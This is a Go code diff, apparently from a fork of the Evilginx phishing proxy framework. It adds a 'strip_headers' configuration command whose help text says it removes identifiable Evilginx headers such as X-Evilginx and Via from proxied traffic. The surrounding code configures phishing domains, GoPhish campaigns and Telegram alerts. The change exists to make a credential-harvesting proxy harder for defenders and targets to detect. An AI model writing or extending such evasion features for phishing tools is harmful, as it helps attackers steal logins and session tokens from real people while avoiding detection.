@@ -192,8 +192,8 @@ func (t *Terminal) handleConfig(args []string) error {
 			gophishInsecure = "true"
 		}
 
-		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken"}
-		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken}
+		keys := []string{"domain", "external_ipv4", "bind_ipv4", "https_port", "dns_port", "unauth_url", "autocert", "strip_headers", "gophish admin_url", "gophish api_key", "gophish insecure", "chatid", "teletoken"}
+		vals := []string{t.cfg.general.Domain, t.cfg.general.ExternalIpv4, t.cfg.general.BindIpv4, strconv.Itoa(t.cfg.general.HttpsPort), strconv.Itoa(t.cfg.general.DnsPort), t.cfg.general.UnauthUrl, autocertOnOff, t.cfg.GetStripHeadersStatus(), t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), gophishInsecure, t.cfg.general.Chatid, t.cfg.general.Teletoken}
 		log.Printf("\n%s\n", AsRows(keys, vals))
 		return nil
 	    } else if pn == 2 {
@@ -232,6 +232,17 @@ func (t *Terminal) handleConfig(args []string) error {
         case "teletoken":
             t.cfg.SetTeletoken(args[1])
             return nil
+
+        case "strip_headers":
+            switch args[1] {
+            case "on":
+                t.cfg.SetStripHeaders(true)
+                return nil
+            case "off":
+                t.cfg.SetStripHeaders(false)
+                return nil
+            }
+
         case "gophish":
             switch args[1] {
             case "test":
@@ -1184,10 +1195,11 @@ func (t *Terminal) monitorLurePause() {
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
 	h.AddCommand("config", "general", "manage general configuration", "Shows values of all configuration variables and allows to change them.", LAYER_TOP,
-    readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
-        readline.PcItem("chatid"), readline.PcItem("teletoken"),
-        readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
-		readline.PcItem("telegram", readline.PcItem("test"))))
+readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
+    readline.PcItem("chatid"), readline.PcItem("teletoken"),
+    readline.PcItem("strip_headers", readline.PcItem("on"), readline.PcItem("off")),
+    readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")),
+    readline.PcItem("telegram", readline.PcItem("test")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
 	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. evilsite.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
@@ -1200,6 +1212,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
 	h.AddSubCommand("config", []string{"telegram", "test"}, "telegram test", "send a test notification to your Telegram to verify the configuration")
+	h.AddSubCommand("config", []string{"strip_headers"}, "strip_headers <on|off>", "enable or disable removal of identifiable Evilginx headers (X-Evilginx, Via, X-Forwarded-*, etc.) from all requests and responses")
 
 	h.AddCommand("proxy", "general", "manage proxy configuration", "Configures proxy which will be used to proxy the connection to remote website", LAYER_TOP,
 		readline.PcItem("proxy", readline.PcItem("enable"), readline.PcItem("disable"), readline.PcItem("type"), readline.PcItem("address"), readline.PcItem("port"), readline.PcItem("username"), readline.PcItem("password")))
